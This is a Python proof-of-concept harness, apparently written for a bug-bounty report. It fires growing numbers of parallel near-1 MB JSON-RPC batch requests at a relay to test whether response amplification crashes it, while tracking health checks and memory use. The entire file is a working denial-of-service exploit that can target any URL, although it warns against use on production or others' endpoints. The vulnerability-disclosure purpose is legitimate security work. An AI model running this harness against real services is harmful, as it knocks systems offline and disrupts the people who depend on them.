#!/usr/bin/env python3
"""
Escalation harness for FINDING-001 — determines the TRUE worst-case severity by
measuring whether concurrent oversized-batch requests degrade the relay to the
point of unavailability or crash (OOM).

This answers the question triage will ask: "is this just a transient slowdown
(Medium), or does it actually take the service down (a named in-scope
'service crash' impact)?" We do not argue the answer — we measure it.

Method: for each concurrency level C in --levels, fire C parallel ~0.95 MB
amplification requests. Throughout, a separate monitor thread polls the relay's
health/liveness endpoint (and eth_chainId) and records availability + latency.
If --relay-pid is given, it also samples the relay process RSS so you can show
the memory blow-up directly.

*** WARNING ***
If the finding is real, THIS WILL CRASH OR HANG THE RELAY at higher concurrency.
Run it ONLY against a disposable/test instance you control — never production,
never someone else's endpoint.

Usage:
    RELAY_TARGET_URL=http://127.0.0.1:7546 \
      python poc_batch_amplification_concurrent.py --levels 1 2 4 8 16 --relay-pid $(pgrep -f 'node.*relay' | head -1)
"""
import argparse
import json
import os
import statistics
import threading
import time
import urllib.error
import urllib.request


def build_batch_for_size(size_mb: float):
    target = int(size_mb * 1024 * 1024)
    n = max(1, (target - 2) // 2 + 1)
    body = ("[1" + ",1" * (n - 1) + "]").encode("ascii")
    while len(body) > target and n > 1:
        n -= 1
        body = ("[1" + ",1" * (n - 1) + "]").encode("ascii")
    return body, n


def post(url: str, body: bytes, timeout: float):
    req = urllib.request.Request(url, data=body, headers={"Content-Type": "application/json"}, method="POST")
    t0 = time.monotonic()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return time.monotonic() - t0, resp.status, len(resp.read())
    except urllib.error.HTTPError as e:
        return time.monotonic() - t0, e.code, len(e.read())
    except Exception as e:
        return time.monotonic() - t0, None, repr(e)


def get(url: str, timeout: float):
    try:
        with urllib.request.urlopen(url, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")[:20]
    except urllib.error.HTTPError as e:
        return e.code, ""
    except Exception as e:
        return None, repr(e)[:40]


def read_rss_kb(pid: int):
    """Linux RSS in KB from /proc/<pid>/status, or None."""
    try:
        with open(f"/proc/{pid}/status") as f:
            for line in f:
                if line.startswith("VmRSS:"):
                    return int(line.split()[1])
    except Exception:
        return None
    return None


def monitor(base_url: str, pid, stop_evt, samples):
    health_url = base_url.rstrip("/") + "/health/liveness"
    while not stop_evt.is_set():
        t0 = time.monotonic()
        status, _ = get(health_url, timeout=5)
        latency = time.monotonic() - t0
        rss = read_rss_kb(pid) if pid else None
        samples.append((time.monotonic(), status, latency, rss))
        time.sleep(0.1)


def run_level(url: str, body: bytes, concurrency: int, timeout: float):
    results = [None] * concurrency
    threads = []

    def worker(i):
        results[i] = post(url, body, timeout)

    t0 = time.monotonic()
    for i in range(concurrency):
        t = threading.Thread(target=worker, args=(i,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    wall = time.monotonic() - t0
    return results, wall


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url", default=os.environ.get("RELAY_TARGET_URL", "http://127.0.0.1:7546"))
    ap.add_argument("--levels", type=int, nargs="+", default=[1, 2, 4, 8, 16])
    ap.add_argument("--size-mb", type=float, default=0.95)
    ap.add_argument("--timeout", type=float, default=60.0)
    ap.add_argument("--relay-pid", type=int, default=None, help="relay process PID, to sample RSS memory")
    ap.add_argument("--settle", type=float, default=3.0, help="seconds to wait/recover between levels")
    args = ap.parse_args()

    print(f"Target: {args.url}")
    print("*** WARNING: this may CRASH the relay. Test instance only. ***\n")

    body, n = build_batch_for_size(args.size_mb)
    print(f"Per-request payload: {len(body)/1024/1024:.3f} MB, {n:,} elements (~80x response)\n")

    samples = []
    stop_evt = threading.Event()
    mon = threading.Thread(target=monitor, args=(args.url, args.relay_pid, stop_evt, samples), daemon=True)
    mon.start()

    baseline_rss = read_rss_kb(args.relay_pid) if args.relay_pid else None
    if baseline_rss:
        print(f"Baseline relay RSS: {baseline_rss/1024:.0f} MB\n")

    crashed_at = None
    for c in args.levels:
        seg_start = len(samples)
        print(f"--- concurrency {c} ---")
        results, wall = run_level(args.url, body, c, args.timeout)
        ok = sum(1 for r in results if isinstance(r[1], int) and r[1] == 200)
        errs = [r for r in results if not (isinstance(r[1], int) and r[1] == 200)]
        print(f"  {c} parallel requests in {wall*1000:.0f} ms | 200-OK: {ok}/{c} | failures: {len(errs)}")
        if errs:
            print(f"  first failure: status={errs[0][1]} detail={errs[0][2]}")

        # health during this segment
        seg = samples[seg_start:]
        health_fail = [s for s in seg if s[1] != 200]
        health_lat = [s[2] for s in seg if s[1] == 200]
        if seg:
            hl = f"{statistics.median(health_lat)*1000:.0f} ms median" if health_lat else "n/a"
            print(f"  health/liveness during: {len(seg)-len(health_fail)}/{len(seg)} OK, latency {hl}"
                  + (f", {len(health_fail)} FAILED" if health_fail else ""))
        if args.relay_pid:
            seg_rss = [s[3] for s in seg if s[3]]
            if seg_rss:
                print(f"  relay RSS during: peak {max(seg_rss)/1024:.0f} MB")

        # crash detection: relay stopped answering health for a sustained stretch
        if seg and all(s[1] != 200 for s in seg[-10:]):
            crashed_at = c
            print(f"  >>> relay appears DOWN (health not responding) at concurrency {c}")
            break
        print(f"  settling {args.settle}s...")
        time.sleep(args.settle)

    stop_evt.set()
    time.sleep(0.3)

    print("\n=== SUMMARY ===")
    if crashed_at:
        print(f"Service became UNAVAILABLE at concurrency {crashed_at} "
              f"(~{crashed_at * len(body)/1024/1024:.1f} MB of request payload, "
              f"~{crashed_at * 80 * len(body)/1024/1024/1024:.2f} GB of response generation).")
        print("=> This supports the in-scope 'service crash / non-network DoS' impact, not just slowdown.")
    else:
        print("Relay stayed up across all tested levels. Impact is degradation, not crash:")
        print("report as availability/latency DoS (Medium). Try higher --levels or match the pod's real memory cap.")
    if args.relay_pid and baseline_rss:
        peak = max((s[3] for s in samples if s[3]), default=None)
        if peak:
            print(f"Relay RSS: baseline {baseline_rss/1024:.0f} MB -> peak {peak/1024:.0f} MB")


if __name__ == "__main__":
    main()
